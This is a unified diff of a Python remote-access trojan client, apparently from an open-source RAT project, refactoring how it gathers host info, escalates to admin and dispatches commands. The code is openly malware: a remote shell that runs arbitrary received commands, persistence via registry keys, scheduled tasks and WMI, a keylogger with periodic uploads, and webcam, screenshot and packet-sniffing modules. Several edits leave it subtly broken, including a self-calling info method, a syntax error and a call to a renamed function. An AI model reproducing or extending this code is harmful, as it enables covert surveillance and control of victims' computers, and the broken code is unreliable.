@@ -80,10 +80,10 @@ else:
 
 
 class Client(object):
-    global __commands__
+    global __command__
     global __modules__
-    __commands__ = {}
-    __modules__  = {}
+    __command__ = {}
+    __modules__ = {}
     def __init__(self, *args, **kwargs):
         time.clock()
         self.mode       = 0
@@ -99,8 +99,9 @@ class Client(object):
         self.q          = long(kwargs.get('q')) or long()
         self.s          = long(kwargs.get('s')) or long()
         self.v          = bool(kwargs.get('v')) or bool()
-        self.cmds       = __commands__
-        self.modules    = __modules__
+        __command__       = __command__
+        __modules__       = __modules__
+        self.info       = self._info()
         self.logger     = self._logger()
         self.results    = self._results()
 
@@ -267,8 +268,20 @@ class Client(object):
             if self.v:
                 print 'Powershell error: {}'.format(str(e))
 
+    def _ip(self):
+        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
+        for target in sources:
+            try:
+                ip = request('GET', target).content
+                if socket.inet_aton(ip):
+                    return ip
+            except: pass
+
+    def _info(self, **args):
+        return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
+
     def _results(self):
-        return {module:{} for module in self.modules}
+        return {module:{} for module in __modules__}
 
     def _create_module_from_url(self, uri, name=None):
         name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
@@ -280,8 +293,18 @@ class Client(object):
         sys.modules[name] = module
         return module
 
+    def _get_admin(self):
+        info = self.info()
+        if info['Admin']:
+            return {'User': info['login'], 'Administrator': info['admin']}
+        if self.f:
+            if os.name is 'nt':
+                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.f))
+            else:
+                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
+
     def _logger(self, port=4321):
-        module_logger = getLogger(self.info().get('IP Address'))
+        module_logger = getLogger(self._ip())
         module_logger.handlers = []
         socket_handler = SocketHandler(self._target(o=self.a, p=self.b), port)
         module_logger.addHandler(socket_handler)
@@ -311,11 +334,11 @@ class Client(object):
 
 # ----------------- PUBLIC FUNCTIONS --------------------------
 
-    def command(fx, cx=__commands__):
+    def command(fx, cx=__command__):
         cx.update({ fx.func_name : fx })
         return fx
 
-    def module(fx, mx=__modules__):
+    def modules(fx, mx=__modules__):
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
@@ -339,49 +362,11 @@ class Client(object):
         fx.status = True if sys.platform in fx.platforms else False
         mx.update({fx.func_name: fx})
         return fx
-
-    @command
-    def ip(self):
-        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
-        for target in sources:
-            try:
-                ip = request('GET', target).content
-                if socket.inet_aton(ip):
-                    return ip
-            except: pass
-
-    @command
-    def mode(self, args=None):
-        if args:
-            mode, _, p = str(args).partition(' ')
-            if mode == 'standby':
-                self.mode = 1
-                port = int(p) if len(p) else 4321
-                self.logger = self._logger(port)
-            else:
-                self.mode = 0
-        output = 'standing by' if self.mode else 'client ready'
-        return output
-    
-    @command
-    def admin(self):
-        info = self.info()
-        if info['Admin']:
-            return {
-                'User': info['login'],
-                'Administrator': info['admin']
-            }
-        if self.f:
-            if os.name is 'nt':
-                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.f))
-            else:
-                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
             
     @command
-    def run(self):
-        mods = [mod for mod in self.modules if self.modules[mod].status if sys.platform in self.modules[mod].platforms if mod not in self.jobs]
+    def run_modules(self):
+        mods = [self.jobs.update({ mod : Thread(target=getattr(self, mod), name=mod }) for mod in __modules__ if __modules__[mod].status if sys.platform in __modules__[mod].platforms if mod not in self.jobs]
         for module in mods:
-            self.jobs[module] = Thread(target=getattr(self, module), name=module)
             self.jobs[module].start()
         if not self.mode:
             return "Tasks complete."
@@ -396,8 +381,8 @@ class Client(object):
             data = self._receive()
             cmd, _, action = data.partition(' ')
 
-            if cmd in self.cmds:
-                result = self.cmds[cmd](action) if len(action) else self.cmds[cmd]()
+            if cmd in __command__:
+                result = __command__[cmd](action) if len(action) else __command__[cmd]()
             else:
                 result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
 
@@ -407,21 +392,21 @@ class Client(object):
                 
     @command
     def standby(self):
+        self.standby.next_run = time.time() + 300
         while True:
-            runs = time.time() + 60.0
-            while time.time() < runs:
+            if self.mode:
+                if time.time() > self.standby.next_run:
+                    self.run()
                 time.sleep(1)
-                if self.mode:
-                    b = self._receive()
-                    if b and len(b):
-                        self.mode = 0 if b else 1
-                else:
-                    break
-            data = self.run()
+                b = self._receive()
+                self.mode = 0 if b else 1
+            else:
+                break
+        return self.shell()
         
     @command
     def start(self):
-        if self.a and self.b:
+        try:
             self.socket = self._connect(host=self._target(o=self.a, p=self.b))
             self.dhkey  = self._diffiehellman()
             while True:
@@ -431,7 +416,9 @@ class Client(object):
                     self.standby()
                 else:
                     self.shell()
-            sys.exit(0)
+        except Exception as e:
+            if self.v:
+                print "Error: '{}'".format(str(e))
         
 # ----------------- KEYLOGGER --------------------------
 
@@ -451,7 +438,7 @@ class Client(object):
             pass
         return True
         
-    def keylogger_logger(self):
+    def keylogger_helper(self):
         while True:
             if self.exit:
                 if len(self.keylogger.options['buffer']):
@@ -474,9 +461,8 @@ class Client(object):
                 self.keylogger.options['next_upload'] += 300.0
 
     def keylogger_manager(self):
-        if 'keylogger_logger' not in self.jobs:
-            self.jobs['keylogger_logger'] = Thread(target=self.keylogger_logger, name=time.time())
-            self.jobs['keylogger_logger'].start()
+            self.jobs['keylogger_helper'] = Thread(target=self.keylogger_helper, name=time.time())
+            self.jobs['keylogger_helper'].start()
             while True:
                 if self.exit:
                     break
@@ -825,16 +811,16 @@ class Client(object):
 
 # ----------------- MODULES --------------------------
 
-    @module
+    @modules
     def persistence(self):
-        for method in persistence_methods:
+        for method in self.persistence.options['methods']:
             if method not in self.results['persistence']:
                 result = getattr(self, 'add_{}_{}_persistence'.format(*method.split()))()
                 self.results['persistence'].update({ method : result })
         _ = self.jobs.pop('persistence', None)
         return result
 
-    @module
+    @modules
     def screenshot(self):
         tmp = mktemp(suffix='.png')
         with mss() as screen:
@@ -844,7 +830,7 @@ class Client(object):
         _ =  self.jobs.pop('screenshot', None)
         return result
 
-    @module
+    @modules
     def keylogger(self):
         if 'keylogger' in self.jobs:
             if not self.jobs['keylogger'].is_alive():
@@ -862,7 +848,7 @@ class Client(object):
         _ = self.jobs.pop('keylogger', None)
         return result
 
-    @module
+    @modules
     def webcam(self):
         if self.webcam.options['image']:
             result = self.webcam_image()
@@ -872,7 +858,7 @@ class Client(object):
         _ = self.jobs.pop('webcam', None)
         return result
 
-    @module
+    @modules
     def packetsniffer(self):
         if 'packetsniffer' not in self.jobs:
             try:
@@ -883,6 +869,7 @@ class Client(object):
         else:
             result = 'packetsniffer is already monitoring network traffic'
         self.results['packetsniffer'].update({ time.ctime() : result })
+        _ = self.jobs.pop('packetsniffer', None)
         return result
 
 # ----------------- COMMANDS --------------------------
@@ -921,19 +908,19 @@ class Client(object):
     def use(self, module): return self._use(module)
 
     @command
-    def stop(self, module): return self._stop(module)  
+    def stop(self, module): return self._stop(module)
 
     @command
-    def info(self, **args): return {'IP Address': self.ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
+    def info(self, **args): return self._show(self.info)
 
     @command    
     def status(self,*args): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))
 
     @command
-    def commands(self, *x): return '\n'.join([cmd for cmd in self.cmds])
+    def commands(self, *x): return '\n'.join([cmd for cmd in __command__])
 
     @command
-    def modules(self, **x): return '\n'.join([mod for mod in self.modules])
+    def modules(self, **x): return '\n'.join([mod for mod in __modules__])
 
 # ----------------- MAIN --------------------------
 
